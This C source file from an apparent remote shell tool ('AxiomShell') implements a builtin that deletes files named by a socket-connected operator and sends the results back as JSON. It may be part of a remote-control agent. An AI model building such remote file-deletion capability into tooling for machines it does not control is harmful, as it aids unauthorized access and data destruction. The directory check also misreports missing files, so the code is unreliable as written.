#include <direct.h>
#include <errno.h>
#include <stdio.h>
#include "AxiomShell.h"

BOOL BUILTIN_rm(SOCKET sock, size_t argc, char **argv)
{
	BOOL res;
	size_t i;
	DWORD ftyp;
	char err_buf[1024];

	memset(err_buf, 0, sizeof(err_buf));
	if (argc == 0)
	{
		JSON_send_packets(JsonCommandOutput, sock, (void *)"[!] Usage: rm [{PATH_1}, {PATH_2}, ...]\n");
		return (FALSE);
	}

	i = 0;
	res = TRUE;
	while (i < argc)
	{
		ftyp = GetFileAttributesA(argv[i]);
		if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		{
			snprintf(err_buf, sizeof(err_buf), "[!] Can not delete %s: is a directory\n", argv[i]);
			JSON_send_packets(JsonCommandOutput, sock, (void*)err_buf);
			i++;
			continue;
		}

		if (remove(argv[i]))
		{
			res = FALSE;
			switch (errno)
			{
				case ENOENT:
					snprintf(err_buf, sizeof(err_buf), "[!] Error deleting file %s: No such file or directory\n", argv[i]);
					JSON_send_packets(JsonCommandOutput, sock, (void*)err_buf);
					break;
				case EACCES:
					snprintf(err_buf, sizeof(err_buf), "[!] Error deleting file %s: Permission denied\n", argv[i]);
					JSON_send_packets(JsonCommandOutput, sock, (void*)err_buf);
					break;
				default:
					snprintf(err_buf, sizeof(err_buf), "[!] Error deleting file %s: Unknown error (%d)\n", argv[i], errno);
					JSON_send_packets(JsonCommandOutput, sock, (void*)err_buf);
					break;
			}
		}
		i++;
	}

	return (res);
}

